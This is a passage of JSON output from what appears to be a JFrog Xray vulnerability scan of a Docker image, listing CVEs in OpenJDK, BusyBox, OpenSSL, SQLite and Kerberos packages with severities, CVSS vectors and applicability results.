                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-21954",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-539897",
                    "summary": "A use-after-free vulnerability was discovered in xasprintf function in xfuncs_printf.c:344 in BusyBox v.1.36.1.",
                    "description": "A use-after-free vulnerability was discovered in xasprintf function in xfuncs_printf.c:344 in BusyBox v.1.36.1.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-42363",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-11-28T00:00:00.429Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2023-42363",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the <code>awk</code> tool is used from the  vulnerable <code>Busybox</code> suite tool.</p>",
                            "evidence": null,
                            "info": "The vulnerable `awk` is never used from the `Busybox` suite tool",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2023-42363",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the <code>awk</code> tool is used from the  vulnerable <code>Busybox</code> suite tool.</p>",
                            "evidence": null,
                            "info": "The vulnerable `awk` is never used from the `Busybox` suite tool",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2023-42363",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2023-42363",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195098",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21299",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.948Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21299",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-208669",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 7.5 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 7.5 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21476",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2022-04-20T00:00:00.199Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "cve_id": "CVE-2022-21476",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable \"XML Signature Validation\" API is in use, by checking for calls to <code>XMLSignature.validate</code> with a non-constant 1st argument</p>",
                            "evidence": null,
                            "info": "The vulnerable function XMLSignature.validate is never called",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "cve_id": "CVE-2022-21476",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable \"XML Signature Validation\" API is in use, by checking for calls to <code>XMLSignature.validate</code> with a non-constant 1st argument</p>",
                            "evidence": null,
                            "info": "The vulnerable function XMLSignature.validate is never called",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "cve_id": "CVE-2022-21476",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable \"XML Signature Validation\" API is in use, by checking for calls to <code>XMLSignature.validate</code> with a non-constant 1st argument</p>",
                            "evidence": null,
                            "info": "The vulnerable function XMLSignature.validate is never called",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "vulnerability_id": "CVE-2022-21476",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "vulnerability_id": "CVE-2022-21476",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "vulnerability_id": "CVE-2022-21476",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-514979",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.8, 21.3.4 and  22.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.8, 21.3.4 and  22.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-21938",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-04-19T00:00:00.716Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-21938",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-523321",
                    "summary": "Issue summary: The AES-SIV cipher implementation contains a bug that causes\nit to ignore empty associated data entries which are unauthenticated as\na consequence.\n\nImpact summary: Applications that use the AES-SIV algorithm and want to\nauthenticate empty data entries as associated data can be misled by removing,\nadding or reordering such empty entries as these are ignored by the OpenSSL\nimplementation. We are currently unaware of any such applications.\n\nThe AES-SIV algorithm allows for authentication of multiple associated\ndata entries along with the encryption. To authenticate empty data the\napplication has to call EVP_EncryptUpdate() (or EVP_CipherUpdate()) with\nNULL pointer as the output buffer and 0 as the input buffer length.\nThe AES-SIV implementation in OpenSSL just returns success for such a call\ninstead of performing the associated data authentication operation.\nThe empty data thus will not be authenticated.\n\nAs this issue does not affect non-empty associated data authentication and\nwe expect it to be rare for an application to use empty associated data\nentries this is qualified as Low severity issue.",
                    "description": "Issue summary: The AES-SIV cipher implementation contains a bug that causes\nit to ignore empty associated data entries which are unauthenticated as\na consequence.\n\nImpact summary: Applications that use the AES-SIV algorithm and want to\nauthenticate empty data entries as associated data can be misled by removing,\nadding or reordering such empty entries as these are ignored by the OpenSSL\nimplementation. We are currently unaware of any such applications.\n\nThe AES-SIV algorithm allows for authentication of multiple associated\ndata entries along with the encryption. To authenticate empty data the\napplication has to call EVP_EncryptUpdate() (or EVP_CipherUpdate()) with\nNULL pointer as the output buffer and 0 as the input buffer length.\nThe AES-SIV implementation in OpenSSL just returns success for such a call\ninstead of performing the associated data authentication operation.\nThe empty data thus will not be authenticated.\n\nAs this issue does not affect non-empty associated data authentication and\nwe expect it to be rare for an application to use empty associated data\nentries this is qualified as Low severity issue.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-2975",
                            "cwe": [
                                "CWE-287"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-07-15T00:00:00.540Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-2975",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-99971",
                    "summary": "ext/fts3/fts3.c in SQLite before 3.32.0 has a use-after-free in fts3EvalNextRow, related to the snippet feature.",
                    "description": "ext/fts3/fts3.c in SQLite before 3.32.0 has a use-after-free in fts3EvalNextRow, related to the snippet feature.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-13630",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "4.4/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "7.0/CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2020-06-05T00:00:00.289Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-13630",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187938",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35603",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.742Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35603",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-588120",
                    "summary": "Issue summary: The POLY1305 MAC (message authentication code) implementation\ncontains a bug that might corrupt the internal state of applications running\non PowerPC CPU based platforms if the CPU provides vector instructions.\n\nImpact summary: If an attacker can influence whether the POLY1305 MAC\nalgorithm is used, the application state might be corrupted with various\napplication dependent consequences.\n\nThe POLY1305 MAC (message authentication code) implementation in OpenSSL for\nPowerPC CPUs restores the contents of vector registers in a different order\nthan they are saved. Thus the contents of some of these vector registers\nare corrupted when returning to the caller. The vulnerable code is used only\non newer PowerPC processors supporting the PowerISA 2.07 instructions.\n\nThe consequences of this kind of internal application state corruption can\nbe various - from no consequences, if the calling application does not\ndepend on the contents of non-volatile XMM registers at all, to the worst\nconsequences, where the attacker could get complete control of the application\nprocess. However unless the compiler uses the vector registers for storing\npointers, the most likely consequence, if any, would be an incorrect result\nof some application dependent calculations or a crash leading to a denial of\nservice.\n\nThe POLY1305 MAC algorithm is most frequently used as part of the\nCHACHA20-POLY1305 AEAD (authenticated encryption with associated data)\nalgorithm. The most common usage of this AEAD cipher is with TLS protocol\nversions 1.2 and 1.3. If this cipher is enabled on the server a malicious\nclient can influence whether this AEAD cipher is used. This implies that\nTLS server applications using OpenSSL can be potentially impacted. However\nwe are currently not aware of any concrete application that would be affected\nby this issue therefore we consider this a Low severity security issue.",
                    "description": "Issue summary: The POLY1305 MAC (message authentication code) implementation\ncontains a bug that might corrupt the internal state of applications running\non PowerPC CPU based platforms if the CPU provides vector instructions.\n\nImpact summary: If an attacker can influence whether the POLY1305 MAC\nalgorithm is used, the application state might be corrupted with various\napplication dependent consequences.\n\nThe POLY1305 MAC (message authentication code) implementation in OpenSSL for\nPowerPC CPUs restores the contents of vector registers in a different order\nthan they are saved. Thus the contents of some of these vector registers\nare corrupted when returning to the caller. The vulnerable code is used only\non newer PowerPC processors supporting the PowerISA 2.07 instructions.\n\nThe consequences of this kind of internal application state corruption can\nbe various - from no consequences, if the calling application does not\ndepend on the contents of non-volatile XMM registers at all, to the worst\nconsequences, where the attacker could get complete control of the application\nprocess. However unless the compiler uses the vector registers for storing\npointers, the most likely consequence, if any, would be an incorrect result\nof some application dependent calculations or a crash leading to a denial of\nservice.\n\nThe POLY1305 MAC algorithm is most frequently used as part of the\nCHACHA20-POLY1305 AEAD (authenticated encryption with associated data)\nalgorithm. The most common usage of this AEAD cipher is with TLS protocol\nversions 1.2 and 1.3. If this cipher is enabled on the server a malicious\nclient can influence whether this AEAD cipher is used. This implies that\nTLS server applications using OpenSSL can be potentially impacted. However\nwe are currently not aware of any concrete application that would be affected\nby this issue therefore we consider this a Low severity security issue.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-6129",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H"
                        }
                    ],
                    "created": "2024-01-09T00:00:00.114Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-6129",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-678577",
                    "summary": "Buffer overflow in Kerberos 4 KDC program allows remote attackers to cause a denial of service via the e_msg variable in the kerb_err_reply function.",
                    "description": "Buffer overflow in Kerberos 4 KDC program allows remote attackers to cause a denial of service via the e_msg variable in the kerb_err_reply function.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2000-0548",
                            "cwe": [
                                "CWE-120"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P"
                        }
                    ],
                    "created": "2025-03-23T00:00:00.584Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2000-0548",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-99970",
